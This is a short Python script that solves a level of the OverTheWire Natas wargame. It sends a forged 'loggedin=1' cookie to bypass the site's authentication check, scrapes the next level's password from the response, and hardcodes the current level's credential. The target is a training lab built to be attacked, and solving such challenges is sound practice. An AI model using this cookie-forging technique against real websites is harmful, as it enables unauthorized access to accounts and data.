#!/usr/bin/python3

import requests
import re

username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'

url = 'http://%s.natas.labs.overthewire.org' % username

# coming from natas6
# hdr = {'Referer':'http://natas6.natas.labs.overthewire.org/'}
cookie = {'loggedin':'1'}
response = requests.get(url, auth = (username, password), cookies=cookie)
content = response.text
# print(content)


pwd = re.findall('natas6 is (.*)<', content)[0]
print(pwd)

